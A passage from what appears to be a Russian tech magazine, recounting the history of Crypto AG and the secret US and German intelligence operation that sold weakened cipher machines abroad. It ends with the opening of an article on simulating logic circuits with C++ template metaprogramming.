в таких количествах, что американское правитель ство прикажет мобили‐
зовать для этого заводы, производящие печатные машинки.





  М‐209 в полной армейской комплектации — с сумкой для переноски
  и инструкцией





                         Внутреннос ти M‐209

Но гораздо важнее было то, что в 1937 году Хагелин познакомился и под‐
ружился с другим эмигрантом из России, прос лавленным «отцом американ‐
ской криптологии», изоб ретателем самого этого термина — Уильямом Фрид‐
маном.
  Война вынудила Хагелина на нес колько лет остаться в США. Он проводил
время, оказывая услуги ремонта сво их же шифровальных машин и улаживая
юридические тонкости сделки с американской арми ей. В итоге он передал
армии патентные права на свою машину в обмен на несколько мил лионов
долларов, американское гражданс тво и право продолжать изготовлять и про‐
давать свою коммерчески успешную машину, несмотря на передачу патента.
Так Хагелин стал первым в истории миллионером, сколотившим сос тояние
на криптографии.





                   Борис Хагелин в сороковые


ДЖЕНТЛЬМЕНСКОЕ СОГЛАШЕНИЕ
После окончания войны раз богатевший Хагелин отправляется вместо Шве‐
ции в Швейцарию — чтобы вос пользовать ся тамошним привлекательным
налоговым режимом и осно вать новую компанию под наз ванием Crypto AG.
Он планирует быть главным гражданским производителем шифровальной
техники — не связанным ни с каким государс твом. Однако внушительный
послужной список играл ему на руку и при давал авторитета.
  И тут кое‐что идет не так. Пос ле окончания войны американская армия
начинает распродавать по дешевке свои огромные запасы полевых шиф‐
раторов — тех самых, которые Хагелин планиро вал выпускать. Он всту пает
в бурную переписку со своим дру гом Фридманом, тот всячески обе щает
помочь — из профессиональной солидарности и по поручению АНБ, которое
назначило его ответственным за контакт с Хагелиным.





                          Уильям Фридман

Но все это явно показывает Хагелину, что почивать на лаврах вредно для биз‐
неса. Он разрабатывает новую машину и предос тавляет ее прототип АНБ
для информации — судя по всему, в рамках все той же дружбы с Фридманом.
   Увиденное АНБ не раду ет. За время войны американская раз ведка успела
пристраститься к чтению вражеских шифров — немецких и японских, рас‐
шифрованных криптолога ми. Но в пос лево енных реалиях аналитики опа‐
сались, что новые противники из коммунистичес кого блока не дадут им такой
возможности. Пер спектива свободной про дажи машин Хагелина усиливала
эти опасения.
  Именно поэтому с 1951 года Фридман и Хагелин регулярно встре чаются
в фешенебельных клубах и обсуждают дела. Энергичный Фридман сыплет
предложениями и обещаниями, которые его начальство не спешит под‐
тверждать письмами и чеками. Но Хагелин дорожит дружбой и питает сим‐
патии к Америке — так что четыре года он выполняет обязательство, данное
на словах за парой бокалов в клубе.





  Дружеская открытка от Фридмана и его жены и ассистентки Элизабет
  Борису Хагелину, 1956 год

Суть этого «джентльменского соглашения» заключалась в первую очередь
в том, чтобы Хагелин продавал свои самые криптостой кие машины только
по списку стран, одобренных США. Остальным клиентам он должен был
предлагать менее стой кие машины, сооб щения которых АНБ могло взломать.
За это Хагелину обещали крупные финансовые компенсации и контракты
на поставку его машин в США.
  Вдобавок прилагалось обещание дальнейшего плодотворного сотрудни‐
чества. Хагелин сооб щал о своих клиентах и объемах их заказов, а также тро‐
гательно беспокоился о том, чтобы стра ны, получившие его новейшие
машины, знали, как пра вильно их использовать, не делая слу чайно шиф ры
менее стойкими. Услышав об этом, в АНБ составили две версии инструкций
к машинам — одну для доверенных клиентов (членов НАТО, например Фран‐
ции, у которой в то время были проб лемы с практиками шифрования,
вызывавшими тревогу в Америке), а дру гую, содержащую намеренно неп‐
равильные указания к применению, — для всех осталь ных.


ДРУЖБА — ЭТО ЧУДО
Хочется особо подчеркнуть, какую роль в этой истории играла дружба и доб‐
рая воля. Мировая политика и страшные шпионские тайны не просто зависе‐
ли от теплых отношений двух коллег, родившихся когда‐то в одной стране.
Огромные махины правительственных контор нуждались в том, чтобы их нас‐
тойчиво уговаривали хоть как‐то обозначить свое учас тие в выгодном и важ‐
ном деле. Все много раз могло пойти не так.
  После подписания догово ра в 1955 году Фридман вынужден уйти из АНБ
в отставку по состоянию здо ровья (он был тру доголиком, и еще в военное
время это порой доводило его до тяжелейшего переутомления и гос питали‐
зации). Он после этого продолжает сотрудни чать с АНБ и другими струк‐
турами НАТО в качестве консультанта — но к нему рез ко меня ется отно‐
шение.
  На письма Фридмана с запросами и предложениями отвечают отписками,
а в какой‐то момент и вовсе решают, что он слиш ком назойлив, и посылают
агентов к нему домой, конфиску ют некоторые его личные документы и зап‐
рещают публиковать научные статьи в открытых журналах — в том чис ле
литературоведческих (Фридман обо жал искать коды и скры тые послания
в литературе и пытал ся расшифровать ма нус крипт Вой нича — правда,
не преуспел).
  И пока Фридман никак не может воз действо вать на положение дел, инте‐
рес к только что заключенному договору с Хагелином в АНБ резко падает.
Хагелин очень недоволен. Годами его кормят обещаниями и просят работать
не в полную силу (а работать он тоже очень любит) — а благодарности
и выполненных обещаний он видит мало.
  Во вторую половину пятидесятых вся эта история име ла много поводов
развиваться совершенно ина че. У Бориса Хагелина был сын Бо — тоже
талантливый инженер‐криптограф, который считал, что отец его недооце‐
нивает, сначала отверг, а потом присвоил его идею для успешной модели
карманного шифратора и дает мало денег. Но Фридман сумел подружиться
и с Бо и на протяжении многих лет убеж дал его не рвать контакты с отцом.





  Уильям Фридман, Элизабет Фридман и жена Бориса Хагелина Анни
  (справа) в Швейцарии, 1957 год

Борису Хагелину также делали выгодные предложения другие страны, и он
обдумывал возможность нарушить соглашение с США — каких‐либо методов
принуждения у АНБ не было. Но в ито ге Хагелин выб рал быть верным своему
слову и своей дружбе с Фридманом. Они продол жали вес ти перепис ку
до самой смерти Фридмана. Фридман тяжело болел и не мог больше
покидать свой дом, но Хагелин несколько раз навещал его в Аме рике. Фрид‐
ман хотел, чтобы последним делом его жизни ста ла биография Хагелина,
над которой они работа ли вместе, но в апреле 1969‐го ему пришлось отос‐
лать черновики в Швейцарию, так как сил продол жать работу уже не было.
В ноябре 1969 года Фридман умер.
  Но и в конце своей жизни Фридман с увлечением обсуждал с Хагелином
криптографию — свою истинную любовь. И после смерти он сумел отомстить
своим бывшим работодателям в АНБ, которые ценили его, лишь пока он бес‐
прекословно делал, что прикажут, ставили ему пал ки в колеса и, что самое
страшное, хотели запретить любое изучение крип тографии гражданским уче‐
ным.
  Орудием мести он выбрал свой архив, который передал не в АНБ, а в биб‐
лиотеку мемориального Фонда генера ла Джор джа Маршалла —  чтобы
общественность в будущем имела шансы узнать о произошедшем. Так оно
и вышло: переписка Фридмана  с  Хагелином  позволила предполагать
о существовании «джентльменского соглашения» еще до нынешних мас‐
штабных разоблачений.





  Над этим отрывком из отчета Фридмана о встрече с Хагелином цензура
  поработала недостаточно тщательно


ПРЕДЛОЖЕНИЕ, ОТ КОТОРОГО НЕ ОТКАЗЫВАЮТСЯ
В середине шестидесятых годов назревает возможность углу бить сотрудни‐
чество. Хагелин всю жизнь работал с механическими шифраторами. Но прог‐
ресс не стоял на месте, и было понятно, что будущее за электронными
устройствами. Хагелин не желал уходить со сцены, но самос тоятельно раз‐
работать совершенно новые модели не мог.
  АНБ вызвалось помочь и предложило использовать в качес тве крип‐
тологического сердца машины электронную схему, реализующую шиф‐
рование на основе сдвиговых регистров. Ана литиков АНБ вол новали пер‐
спективы распространения электронных шифраторов — взламывать их коды
было бы куда сложнее. Но они зна ли, что на этапе разработки шифрующей
микросхемы можно задать такой алгоритм, который выглядит использующим
надежные, случайные пос ледова тельности для шифровки, но на самом деле
содержит уязвимость. Псевдослучайные числа будут пери одически пов‐
торяться — и, зная, как именно, взло мать эти шифры будет значительно лег‐
че.
  Именно такие машины, с подправленны ми алгоритмами, в Crypto AG
собирались предлагать большинству покупа телей. И лишь союзникам по бло‐
кам НАТО предназначались шифраторы с алгоритмами, работающими в пол‐
ную силу. Учитывая, что Хагелин уже много лет про давал клиентам из разных
списков  товары  разного  качества,  прин ципиаль но  для  него  ничего
не менялось. Но теперь его биз нес был полностью зависим от поставок АНБ.





  Новая модель шифратора — H460. В металличес кой коробке справа —
  микросхемы, сердце устройства

А бизнес шел хорошо — клиенты спешили заказать новую модель. Однако
новинка оказалась капризной. Ранние модели получи лись чрез вычай но чувс‐
твительны к толчкам и перепадам температу ры. Приходилось возвращать их
производителю. Также в те времена возникли первые подозрения, что с шиф‐
рованием здесь может быть что‐то не так.
   Уязвимости в шифровании независимо друг от друга обнаружили италь‐
янские и египетские покупатели. Но компания уверила их, что все недостатки
будут исправлены, — и заменила крип тологические микросхемы на другую
версию, тоже предоставленную АНБ и все еще выдающую подверженные
дешифрованию результаты. Проверить, что именно поменя ли, все равно
было ужасно трудно — в микросхемах электронные эле менты соединялись
сложнейшей паутиной вручную сплетенных проводков, в которых даже
находить брак при проверке на производстве и то было сложно.





       Переплетение про водов в криптографической микросхе ме




                                     Продолжение статьи →
ПРИВАТНОСТЬ           ← НАЧАЛО СТАТЬИ
      ШВЕЙЦАРСКАЯ
     НЕНАДЕЖНОСТЬ
                      КАК АМЕРИКАНСКАЯ РАЗВЕДКА
                ВНЕДРИЛА УЯЗВИМОСТИ В ШИФРЫ
                        КОМПАНИИ CRYPTO AG





ЗАКРЫТИЕ СДЕЛКИ
К концу шестидесятых Хагелину было уже под восемьдесят. Его заботило
будущее компании, а также своей второй жены — после смерти первой суп‐
руги он женился на ее сиделке. Он хотел, чтобы, когда его не станет, их
положение не ухудшилось.
  Озабочены будущим были и в американской разведке — ведь они рис‐
ковали потерять то, к чему уже привыкли. Передать контору Бориса Хагелина
его сыну Бо было малореально не  только  из‐за сложных отношений
с отцом — Бо еще и не вызывал доверия у раз ведчиков. В 1970 году он погиб
в автокатастрофе в США (никаких свидетельств того, что в этой катас трофе
было что‐то подозрительное, не имеется). Других наследников у Хагелина
не осталось.
  Но была  идея, которую первой предложила французская  разведка
еще в 1967 году. Как союзники по бло ку НАТО, они знали об успехах своих
американских  кол лег и испытыва ли профес сиональную  зависть, желая
заполучить подобные ресурсы и для себя. Французы пред ложили Хагелину
купить его компанию целиком — в партнерстве с немцами.
   Тогда Хагелин отказался и сооб щил о предложении американцам. Но идея
многим показалась интерес ной. И спустя пару лет немцы попробовали пред‐
ложить американцам вступить в партнерство.
   Нельзя сказать, что те не думали о такой идее, — но внутренние разборки
между ЦРУ и АНБ мешали проработать план этой операции, как и ранее
с соглашением Фридмана. Но выяс нилось, что, пока американцы мешкают,
другие пытаются действо вать — и решение было при нято.
  Великодушно согласившись на предложение немцев, аме риканские кол‐
леги попросили их разоб рать ся с парой нюансов. Во‐первых, отказать фран‐
цузским спецслужбам в сотрудничестве, а во‐вторых — найти способ
перевести Хагелину деньги тайно, чтобы не ста ло известно, кто будет покупа‐
телем в сделке. Сумму сделки согласились поделить пополам — вместе выш‐
ло примерно 5,75 миллиона долларов.
  Немцы решили обес печить конфиденциальность сдел ки с помощью юри‐
дической фирмы из Лихтенштейна. Сложные законы маленькой страны поз‐
волили удобно спрятать настоящих владельцев за несколькими подставными
компаниями и пакетами анонимных акций на предъявителя. За это фирма
получила продолжительный контракт на юридичес кие услуги — главный
смысл которых после заключения сделки сос тавляло сохранение тайны.
Таким образом 4 июня 1970 года и была окончательно оформле на продажа
компании.





  Открытка от Хагелина Элизабет Фридман. Хагелин уже на пенсии, Фрид ‐
  ман умер — но с его женой он продолжает переписываться

Даже в новом совете директоров Crypto AG о вмешательстве раз ведки знал
только один человек — да и тот уволился в 1976 году. Хагелин же покинул
совет директоров после сделки и смерти своего сына и занялся написанием
мемуаров. Он прожил еще долго и умер в возрасте 91 года.


ЗАКЛЯТЫЕ ДРУЗЬЯ
Вскоре после заключения сделки выяс нилось, что купить компанию —
это полдела, надо еще и договориться о том, как с ней быть. Представите ли
немецкой и американской раз ведки постоянно устра ивали совещания на эту
тему. Некоторые вопросы уда валось раз решить и превратить в регулярную
практику — например, договорились, что немецкая разведка BND отвечает
за бухгалтерию Crypto AG и раз в год передает партнерам из ЦРУ половину
прибыли. Передавали на подземной парковке, в чемодане с наличными.
   Удалось также разрешить и техническую сто рону вопроса — чтобы про‐
дукты Crypto AG оставались конкурентоспо соб ными, а договоры — выгод‐
ными, немецкая сторона привлекла на помощь Siemens (за вознаграждение
в 5% от годовой прибыли Crypto AG), а американцы — Motorola. Корпорации
были не против оказывать пат риотическую помощь разведкам своих стран.
  А с прибылью дела обстояли неплохо. За пять лет владения продажи
машин Crypto AG вырос ли больше чем в три раза — в 1975 году объем про‐
даж достиг 19 миллионов долларов. При этом финансовые вопросы станови‐
лись поводом для разногласий меж ду партнерами — немцы стремились, что‐
бы бизнес в первую очередь приносил выгоду, а американцы напоминали им,
что их главная цель — разведданные и успехи в шпионаже.
  В Германии же были недовольны тем, что американцы хотели продавать
машины с уязвимым шифрованием как можно большему чис лу стран, включая
союзников по НАТО — Грецию, Турцию, Италию, Испанию. Немцы изо всех
сил сопротивлялись этому, но в АНБ в конце концов продавили свое
решение, и список стран, одобренных для поставок защищенной шиф роваль‐
ной техники, сократился до минимума (при этом его никогда не покидали
Швеция и Швейцария — ведь там хорошо знали фирму Хагелина и, судя
по всему, подозревали о происхо дящем).


КОРПОРАТИВНАЯ КУЛЬТУРА
Методология перехвата информа ции, которую исполь зовали в ХХ веке в АНБ,
делит весь мир на три зоны: A — советский блок, B — Азия и G — все осталь‐
ные, то есть преимущественно страны третьего мира. И к началу восьмидеся‐
тых больше 50% разведданных из зоны G были зас лугой «Минервы» — ком‐
пании Crypto AG.
   То, с какими клиентами час то приходилось иметь дело компании, порой
определяло стиль ведения биз неса. Большую роль в ее успехе играли хариз‐
матичные агенты по продажам с хорошо подвешенным языком. В Саудовской
Аравии они везли с собой в чемодане дорогие часы Rolex для подкупа
и устраивали «обучающие семинары», включавшие в себя походы в бордели.
  Или вот курьезный эпизод: покупателей из Нигерии они убе дили зак‐
лючить контракт на круп ную сумму, пос ле чего кураторы из спецслужб два
года пытались выяснить, почему же из страны не поступает разведданных.
Оказалось, что дорогое оборудо вание просто не смогли прис троить к делу
и оставили пылиться на складах, не доставая из упа ковки.
   Сотрудникам также час то приходилось рас хва ливать свои продукты и рас‐
пространять дезинформа цию о продуктах конкурентов, чтобы не лишаться
контрактов и не расстра ивать своих владельцев. Нередко они начинали
догадываться, что с их компанией что‐то нечисто, — и бес покойство не могли
заглушить даже высокая зарплата и всевозможные «плюшки в офисе» (среди
которых была даже небольшая парус ная лодка для прогулок на озере непода‐
леку от здания компании).
   Главным камнем преткно вения, разумеется, было шифрование. Сотрудни‐
кам говорили, что с разработ кой им помогает Siemens, но это никак не отве‐
чало на вопрос, почему решения содержали уяз вимости — и почему их зап‐
рещали исправлять.
  В 1977 году инженер Crypto AG Петер Фру тигер, который давно подоз‐
ревал, что его компания свя зана с немецкой разведкой, отправился в коман‐
дировку в Сирию. Тамошние заказ чики жаловались на проблемы с шиф‐
рованием — и вместо того, чтобы успокоить их, как это обычно делалось,
Фрутигер исправил их машины, даже не сооб щив об этом начальству.
   Вскоре дело вскрылось, пос кольку из Сирии перестали приходить раз‐
ведданные, и директор Crypto AG, бывший в курсе дела, уволил Фрутигера.
Как оказалось, напрасно: ЦРУ предпочло бы оста вить его работать в ком‐
пании и платить за молчание, а так пташка выпорхнула из клетки. Фрутигер
не выступал официально ни с какими разоб лачениями, но стал одной
из ниточек, по которым впоследс твии мож но было что‐то заподозрить.
  В 1978 году у озабоченных секретностью разведчиков воз ник еще один
повод понервничать. В Crypto AG наняли, не проконсультировавшись с ними,
талантливую специалистку по электро нике и крип тографии по име ни Менгия
Кафлиш (Mengia Caﬂisch). Спецслужбы взя ли ее на заметку, когда она
работала радиоастрономом в университете Мэриленда в США, — и решили,
что ее невозможно будет обмануть — слиш ком она талантлива и умна. Так
и вышло — в Crypto AG она занялась проверкой алгоритмов шифрования
на прочность, обнаружила уяз вимости и раз работа ла новые версии алгорит‐
мов.





                 Менгия Кафлиш в девянос тые

Подправленные ею алго ритмы даже попали в производство — была выпуще‐
на партия из 50 машин с усиленной криптогра фией. Их пришлось выкупать
и уничтожать — разведка не мог ла позволить, чтобы такие защищенные
машины попали на рынок. Менгии Кафлиш намекнули, что в этой компании
есть свои ограничения и нельзя самовольно улучшать что попало. Она про‐
работала в компании до 1995 года — и ока залась едва ли не единственной
героиней в этой истории, согласившей ся ска зать журналистам что‐то кроме
«без комментариев».
  По словам Кафлиш, никто из рядовых сотрудни ков не был в курсе, что
именно творилось за кулиса ми Crypto AG, — но у многих были подоз рения,
и они не знали, что с ними делать. Сама она теперь думает, что надо было
уволиться пораньше.
   Чтобы как‐то справлять ся с Crypto AG, разведкам‐партнерам нужен был
особенный человек — подкованный в криптологии на высочайшем уровне,
со способностями хариз матичного лидера и безуп речно лояльный. Найти его
было непросто, но помогли коллеги из шведской раз ведки — они были в кур‐
се дела еще из‐за связей Бориса Хагели на со Швецией.
   Кандидатом шведов стал Кьелль‐Уве Видман, профессор математики
из Стокгольма. Он славился как специалист по крип тологии, консультировал
шведскую разведку и был известен давними симпатиями к США — еще со
студенческих времен, когда он провел там год по программе обмена студен‐
тами. Он даже называл себя проз вищем Генри, которое ему дали в Америке,
так как не могли выгово рить его шведское имя.
   Разведчики дол го обха живали Видмана, не раскрывая себя, но, когда
наконец настал момент для откровенного разговора, он согласился сразу,
не прося никакого времени на размышление. И оказал ся бесценным
и незаме нимым специалис том. Спец службы мог ли положиться на него
и меньше волноваться о сложных подробностях криптологии и электроники,
а сотрудники Crypto AG трепета ли перед его научным авторитетом.
   Благодаря Видману были разработаны особо хитрые методы внедрить
в шифры уязвимости — их нельзя обна ружить простыми статистическими тес‐
тами и легко выдать за ошибку оператора оборудования.
  Видман отве чал и за самые важные перего воры. Когда чилийцы хотели
переметнуться  к другому пос тавщику, он убедил  их, что той компании
не дадут лицензию на экспорт (что было правдой — ЦРУ могло это устроить).
Когда после войны за Фолклендские острова аргентинцы были уверены, что
британцы читали их сообщения и благодаря этому одержали над ними
победу, — он убе дил их, что было взло мано чужое устаревшее оборудование,
а лучшие продукты Crypto AG не подведут.
  Но шила было не ута ить в мешке. Слухи располза лись, и большой скандал
был вопросом времени. Однако в вось мидесятые казалось, что все прек‐
расно, и разведчики продолжали пожинать плоды своего хитрого плана.


ГИДРА УГРОЖАЕТ
Как бы стро го ни охраняли свою тайну могущес твенные разведки, понемногу
информация все же утекала из‐под их контроля. Слишком уж масштабной
была операция, слишком удоб но было спецслужбам узнавать, что втайне
обсуждают их коллеги из дру гих стран.
   Когда США в 1978 году были посредниками в мирных переговорах между
Египтом и Израилем — американская раз ведка следила, что о ходе перего‐
воров сообщает себе на родину египетская делегация во главе с президен‐
том Садатом. Когда в 1979 году Иран захватил в заложники посольство США
в Тегеране — разведка следила за коммуникациями Ирана с Алжиром,
который выступал посредником в переговорах, и докладывала пре зиденту
о настроениях противника.
  И слишком часто нужно было, узнав информа цию, делать вид, что не зна‐
ешь ее. Например, как поступить, если ты случайно узнал, что брат президен‐
та Картера, Билли Картер, лоббиру ет интересы диктатора Ливии и получает
от него деньги? Или если ста ло известно, что режим в Аргенти не проводит
бессудные казни тысяч оппозиционеров и договаривается с чилийскими
военными свергнуть тамошнего президента‐коммуниста Альенде?
  Американский ответ таков: в пер вом случае сообщить в ФБР, во втором —
вписаться в дело борьбы с коммунизмом и сделать вид, что никаких прес‐
туплений не про исходит. Даже их партнеров по программе из Германии такое
поведение шокировало.
  Но одно дело профессиональный цинизм — его еще можно ожидать
от разведки. А другое дело — когда раз ведданные используются таким обра‐
зом, что компрометируют саму операцию.
  В 1986 году в Берлине произошел теракт. На популярной у американских
солдат дискотеке La Belle взорвали бомбу. Спус тя десять дней американский
президент Рейган выступил по телевидению с обращением к нации. В нем он
обвинял в теракте Ливию и сообщал, что приказал нанес ти по ней удар воз‐
мездия. По его словам, имелись однозначные свидетельства, что еще за
неделю до взрыва в посольство Ливии в Берлине пришел при каз устроить
атаку — а на следующий день пос ле взрыва посольство отчиталось об успехе
задания.
   Разведка была в шоке — там не ожидали, что президент так воспользуется
предоставленной информа цией. Было непонятно, что отвечать на неудобные
вопросы «как узнали?» и «почему не предотвратили, если знали заранее?».
Зато предельно понятно было, что вра ги Америки проведут рассле дование
и сделают выводы.
  Враги Америки оказались медлитель ны — или терпеливы. Серьезные пос‐
ледствия и крупный скандал ждал Crypto AG толь ко в 1992 году. В докладе
ЦРУ эта история проходит под кодом «Гидра».
  Один из лучших агентов по продажам компании — Ганс Бюлер давно
работал с одним из крупных клиентов — Ираном. После теракта 1986 года
ему пришлось вык ручиваться, отвечая на неудобные вопросы, но потом дела
наладились и пошли как обычно. Он летал в Тегеран по нес колько раз год —
и в 1992 году отправился туда в очередную командировку. И не вернулся
из нее.
  Компания обратилась к швейцарской раз ведке, которая сообщила им, что
Бюлера арестовали власти Ира на. И что его жес тко допрашивали и дела
у него были не  очень. Однако иранцы были  согласны  отпустить его
под «залог» в миллион долларов.
  Владельцы компании из ЦРУ заявили, что это не залог, а выкуп, а США
не платят террористам выкупов. К счастью для Бюлера, немцы согласились
заплатить полную сумму — видимо, они оказались более обеспокоены про‐
исходящим. В итоге Бюлер провел в иранской тюрьме девять месяцев,
и условия там были тяжелыми.
  И что самое обидное, Бюлер ничего не знал. Он был абсолютно не в курсе
дел разведок и уязвимостей в шифровании. Но допросы и лишения, перене‐
сенные им в Иране, заставили его сомневать ся в своем работодате ле. Он
стал встречаться с швейцарскими журналистами, а те начали копать. Всплыли
архивы Фридмана из семидесятых, и в них нашлись подоз рительные намеки.
Удалось найти Петера Фру тигера — в 1994 году его вместе с Бюлером упо‐
минали в репортаже швейцарского телевидения.





                             Ганс Бюлер

Дело немного исправил тогдашний гла ва Crypto AG Михаэль Груп. В той же
передаче он опро верг обвинения и с искренне удивленным выражением лица
говорил, что все эти домыслы абсолютно безумны, такого не может быть
никогда, продук ты Crypto AG используются в Швейцарии и Германии и это
должно ставить их вне подоз рений, а Бюлер и Фрутигер просто распускают
слухи из‐за недовольства усло виями увольнения.
  Но все равно некото рые клиенты отказались от услуг компании (необъ‐
яснимо, но факт — Иран, наобо рот, возоб новил контракт), часть сотрудников
уволилась, а журналисты продолжали ходить вокруг темы кругами — нап‐
ример, они раскопали в ста рых документах семиде сятых годов име на,
которыми представлялись сот рудники разведки, когда изображали биз‐
несменов из подставных компаний. Имена оказались настоящими, паспор‐
тными — вот тебе и конспирация...


КОНЕЦ ПРЕКРАСНОЙ ЭПОХИ
Все это означало, что времена меняются. Главной жертвой «Гидры» стало
долгое плодотворное сотрудничество немецкой и американской раз ведок.
На расхождения во взглядах до поры до времени мож но было закрывать гла‐
за, но сейчас они стали для немцев слиш ком рискованными. Если бы тайное
стало явным, им бы пришлось оправдываться перед собратьями по Евро‐
союзу за действия американцев, которые равняли их со странами третьего
мира и сомнительными режимами.
   Так что в 1993 году немцы продали свою долю в Crypto AG аме риканцам
за 17 миллионов дол ларов. Решение было непростым — политикам хотелось
избавиться от рискованного проекта, но ветераны разведки были не рады
отказу от своего успеха, который они когда‐то предложили аме риканцам.
  К тому же после разрыва сотрудничества американцы стали куда менее
охотно делиться информацией — и немецкие спецслужбы уже не могли быть
уверены, как раньше, что они входят в элитный клуб «тех, кого не прослушива‐
ют американцы». И, как показали данные о слеж ке аме риканской раз ведки
за самой Ангелой Меркель, предоставлен ные прессе Эдвардом Сноуде‐
ном, — не напрасно.
  Однако АНБ все было нипочем. Шоу продолжалось. Кризис «Гидра»
с задержанием Бюлера оказался самым серьезным ударом по программе
за все время ее существования — но она усто яла и пережи ла рубеж веков.
Продажи сокращались, и прибыли превратились в убытки — но в ЦРУ всегда
считали, что ком мерческая сто рона — это всего лишь приятное дополнение,
благодаря которому можно профинансировать какие‐нибудь особо темные
дела, но разведданные важнее. И поэтому вложения в Crypto AG продол‐
жались и фирма держалась на плаву.
  Но мир менялся, и авто ры программы ста рались угнаться за ним, как мог‐
ли: Crypto AG освоила выпуск цифровых машин по шифрованию голоса, а в
ЦРУ пытались повторить трюк с покупкой еще какой‐нибудь криптологичес‐
кой компании — судя по всему, для того чтобы обанкротить ее и тем самым
снизить конкуренцию для своего любимого детища. По крайней мере, ходят
слухи, что купить хотели фир му Cretag, давнего соперника Crypto.
  Однако аппаратные технологии шифрования все больше усту пали прог‐
раммным. ЦРУ проигрывало соперничество с АНБ, которое смогло успешно
запустить свои щупальца в американские IT‐корпорации. Впрочем, дела сво‐
рачивали долго. Лишь в 2017 году Crypto AG продала здание своей
штаб‐квартиры, что и стало началом конца.
  А в 2018 году остатки активов компании были проданы в ходе хитрой
финансовой операции. Часть производительных мощностей и почти весь
топ‐менеджмент перешли в новую компанию CyOne, которая теперь продает
шифровальную технику одному клиенту — швей царскому правительству.





  В швейцарском городе Цуг на старом здании штаб‐квартиры Crypto AG
  все еще висит логотип компании, хотя зда ние и про дано (фото Jahi Chik‐
  wendiu для The Washington Post)

Все остальное — вместе с брендом Crypto — досталось частному биз несме‐
ну из Швеции по фамилии Линде, который утверждает, что решил приобрести
компанию частично из шведско го патриотизма и уважения к памяти Хагелина,
а частично — считая, что за слухами о ненадежности оборудования ничего
не стоит и что он вкладывается в давнее и уважаемое предприятие. После
того как с ним пооб щались журналисты, он с грустью отметил, что если все
это правда, то он чувству ет себя обма нутым и переживает за сотрудников
теперь уже его компании, которые тоже были обмануты.
  Сделку, между прочим, оформляла та же самая юридическая контора
из Лихтенштейна, что отвечала и за покупку Crypto AG почти полвека назад.

АНБ или ЦРУ?
И все же кто на ком сто ял? В одном месте мы упоминаем ЦРУ, а в другом —
АНБ, и это не ошибка. Обе эти конторы были вовлечены в историю, но каждая
по‐своему.
  АНБ (NSA) — технологическая раз ведка, главная задача которой — под‐
слушивать и подглядывать по всему миру, а также обеспечивать безопас‐
ность Америки на этом фронте. Дело сотрудников этого ведомства — шиф‐
ры, антенны, спутники, компьютеры. Они ста раются не покидать территории
Америки и своих высоко технологичных баз. Именно на них работали Фрид‐
ман и Хагелин, именно они помогали разрабаты вать технику для Crypto AG
и потом отвечали за расшифровку полученной информации.
  ЦРУ  (CIA) — раз ведка широко го профиля, официально не должна
работать на территории США, отчитывается только перед президентом, отве‐
чает за самые разные вещи — но в основном включающие в себя работу
с людьми за пределами Америки. Их дело — пропаганда, заговоры, дивер‐
сии, вербовка и работа с агентами, а также ведение особо засекреченных
операций, вроде полетов самолетов‐разведчиков или управле ния компанией
Crypto AG. Именно это агентство с американской стороны отвечало за то,
чтобы компания успешно вела бизнес, служила американским инте ресам,
а ее сотрудники были не в курсе истинно го положения дел.
  Но это лишь суперкраткое изло жение чрезвычайно запутанных отношений
между многочисленными американскими спецслуж бами. Поэтому порой мы
пишем «американская раз ведка», а подразумеваем кого‐то из работников
этих ведомств.



ВЫВОДЫ
Вот, в общем‐то, и все. И воз можно, кому‐то захочется спросить — а какое
отношение к настоящему имеют все эти дела минувших дней, когда мик‐
росхемы паяли вручную? Кажется, что до современности вся эта история
дотянула лишь по инерции.
  Мы думаем, что самое пря мое. В этой старомодной истории с эмигранта‐
ми, обедающими с видом на швейцарские озера, и «Ролексами» в чемодане
очень  легко  прослеживаются  сюжеты  из  злободневных  новос тей —
и одновременно корни их зарождения.
  Почему американская раз ведка стра дает такой технократической гиган‐
томанией? Да потому, что ее сотрудники десятилетиями убеждались: тех‐
нологическое превосходс тво работает — и обес печивает невероятные воз‐
можности по всему миру. Если к ним привыкнуть, уже совершенно невоз‐
можно сделать шаг назад. Поэто му они прос то не могут перес тать пытаться
взломать и контро лировать все что только можно. Кроме своего пре зидента,
с публичными выступлениями которого приходится прос то мириться.
  Почему Иран и США пос тоянно про воци руют друг друга, грозят друг дру‐
гу — и так без конца? Потому что они с этого начали, привыкли так пос тупать
и не видят повода прекращать. Как в ЦРУ долго‐долго не видели повода
прекращать тратить день ги на Crypto AG.
  Почему вокруг криптологии и шифрования бушу ют такие страсти? Потому
что в этой теме встречаются зубодробительные математические построения,
доступные немногим, — и стремление контролировать дос туп к информации,
встречающееся у любой влас ти. Вместе они обра зуют нестабильную систему,
где без узких специалистов обойтись невоз можно, но непонятно, как контро‐
лировать их самих.
  И наконец — почему вообще случаются события, которые меня ют мир?
Потому что иногда люди — по своей воле или нечаянно, но стал киваются
с системой. Борис Хагелин и Уильям Фридман хотели скрепить свою дружбу
большим делом, в важность которого они верили. И то, что им хватило упорс‐
тва добиться своей цели, нежданно‐негаданно для них самих изменило мир.
И как в истории Эдварда Сноудена — то, что началось с профессионального
интереса, достигло своей цели бла года ря упорству и иде ализму.
  И завершилось громким разоблачением, потрясшим мир.
КОДИНГ





                                                                                          faberge
                                                                            Цифровыхъ дѣлъ мастеръ
                                                                                           fabulous.faberge@yandex.ru
    ШАБАШ
        ШАБЛОНОВ

                  ПРЕВРАЩАЕМ GCC
                  В МАКЕТНУЮ ПЛАТУ
                     С ПОМОЩЬЮ
                   ШАБЛОНОВ С++




Я люблю  собирать  логические  схемы. Однако обычно
для этого требует ся либо симулятор, либо макетная плата.
Как‐то в дороге у меня был с собой ноутбук с компилятором,
но не было интернета. Задача написать небольшую прог‐
рамму с биб лиоте кой цифровых вентилей показалась мне
слишком тривиальной. Хм‐м, как насчет метапрограммы?


Ты наверняка знаешь (или хотя бы слышал), что шаблоны С++ сами по себе
функциональный язык, обла дающий пол нотой по Тьюрингу. Ины ми словами,
с их помощью можно выполнять стандартные операции, строить выражения
и вычислять какие‐то значения. Которые затем мож но использовать в новых
операциях, снова что‐то считать, и так по кругу, до получе ния нужного резуль‐
тата. И все это — во время компиляции основной программы!
  Но это в теории. На практике шаб лоны С++ всегда были непросты ми
в использовании, и даже сейчас, когда Комитет по стандартизации язы ка
многое сделал для их популяризации и облегчения их применения, далеко
не все разработчики с энтузиаз мом принимаются кодировать логику своих
приложений на этих самых шаблонах.
  Действительно, перспектива вытащить часть вычислений на этап ком‐
пиляции выглядит заманчивой, равно как и возможность управлять самим
процессом компиляции. Однако на практике попытка сделать что‐то полез‐
ное на таком высоком уровне абстракции зачас тую оборачивается многочис‐
ленными ошибками при компиляции, маловразумительными сообщениями
